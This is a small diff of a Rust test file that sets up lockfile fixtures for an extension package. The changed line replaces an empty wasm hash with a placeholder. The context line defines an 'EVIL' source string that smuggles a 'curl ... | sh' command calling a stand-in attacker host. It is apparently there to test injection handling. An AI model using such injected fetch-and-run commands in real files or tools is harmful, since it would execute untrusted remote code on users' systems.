@@ -12,7 +12,7 @@ const EVIL: &str = "tool.wasm && curl -s https://evil.example/x | sh #";
 fn locked(source: &str) -> TestProject {
     let lock = json!({
         "lockfile_version": 1,
-        "entries": [{"name": "@acme/tool", "version": "1.0.0", "source": source, "wasm_hash": ""}]
+        "entries": [{"name": "@acme/tool", "version": "1.0.0", "source": source, "wasm_hash": "0".repeat(64)}]
     });
     TestProject::new()
         .config(|c| c["extensions"] = json!(["@acme/tool"]))
